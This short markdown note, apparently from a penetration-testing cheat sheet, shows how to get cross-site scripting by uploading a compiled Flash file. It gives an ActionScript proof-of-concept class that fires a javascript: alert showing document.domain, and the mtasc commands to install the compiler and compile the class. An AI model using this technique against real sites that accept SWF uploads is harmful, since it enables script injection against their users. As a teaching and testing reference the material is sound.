# SWF-xss-based

###### There are certain cases when .swf files are allowed to upload. In this case, we
###### can craft an ActionScript code to execute JS, compile it, and then upload it on the
###### vulnerable website to achieve XSS capability.


```javascript

	class XSS {
		static var app: XSS;
		function XSS() {
		var xss = "javascript:alert(\"SWF-based XSS: \"+document.domain)";
		getURL(xss, "_self");
		}
		static function main(mc) {
		app = new XSS();
}}

```


To compile this code into a .swf file, we'll use a cross-platform ActionScript2
compiler known as mtasc. It is available at http://www.mtasc.org/mtasc.html

#### install this on .deb based or kali linux
`apt-get install mtasc `


once installed .. 

` $ mtasc -swf xss.swf -main -header 0:0:0 xss.as `

After compilation, we get xss.swf from the original xss.as ActionScript file
